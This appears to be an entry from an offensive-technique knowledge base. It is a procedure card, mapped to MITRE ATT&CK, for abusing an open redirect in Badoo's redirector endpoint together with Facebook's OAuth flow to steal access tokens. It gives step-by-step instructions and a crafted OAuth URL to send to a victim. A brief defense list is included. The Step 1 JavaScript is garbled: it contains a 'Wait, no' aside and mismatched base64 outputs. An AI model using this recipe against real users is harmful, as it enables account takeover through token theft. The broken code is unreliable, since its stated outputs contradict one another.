---
id: proc-001
tags:
  - open-redirect
  - oauth
  - facebook
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:26.826Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Initiate-Facebook-OAuth-with-Malicious-Redirect

## Summary

This procedure crafts a malicious redirect_uri exploiting the open redirect in Badoo's authentication endpoint and initiates the Facebook OAuth flow to set up token theft.

## Description

The Badoo endpoint at /external/redirector.phtml accepts a base64-encoded 'state' parameter as a URL and redirects without validation. By encoding a URL like https://www.google.com/.badoo.com/, IE11 and Edge misparse it as a valid redirect to the attacker's domain. This is used as the redirect_uri in Facebook OAuth, where Facebook allows query parameters, enabling the flow to proceed and append the access_token in the hash upon success.

## Requirements

1. Control over an attacker domain or use of a misparsable URL (e.g., google.com/.attacker.com)
2. Base64 encoding capability
3. Victim access to Facebook-linked Badoo account
4. Web browser (IE11/Edge recommended for parsing exploit)

## Defense

Defensive measures and detection strategies:

- Validate redirect URLs against a whitelist of allowed domains
- Strip or reject dot-appended domains in URL parsing
- Monitor OAuth redirect_uris for anomalies in logs
- Use state parameters with CSRF tokens to prevent tampering

## Objectives

1. Initiate OAuth flow with unvalidated redirect_uri
2. Trick victim into authenticating
3. Position for token exposure in subsequent redirect

## Instructions

### Step 1: Encode Malicious State Parameter

**Context**: Create the base64-encoded state for the redirect_uri to point to the attacker's domain via open redirect.

Encode the URL https://www.google.com/.badoo.com/ to base64 (result: aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyZi5iYWRvby5jb20v).

**Command** (Use online base64 encoder or browser console):

```javascript
// In browser console
atob('https://www.google.com/.badoo.com/'.replace(/\//g, '%2F')) // Wait, no: encode first
btoa('https://www.google.com%2F.badoo.com%2F') // Outputs: aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyRi5iYWRvby5jb20v (adjusted for www)
```

> This generates the state value to append to the redirector URL.

### Step 2: Construct and Access OAuth URL

**Context**: Build the full Facebook OAuth URL with the malicious redirect_uri and open it in a browser to start the flow.

Navigate to or share the following URL with the victim:

```url
https://www.facebook.com/v2.2/dialog/oauth?response_type=token&display=popup&client_id=107433747809&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3fstate%3DaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyZi5iYWRvby5jb20v
```

> Victim clicks and authenticates, setting up the redirect chain.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[open-redirect]]
- [[oauth]]
- [[facebook]]
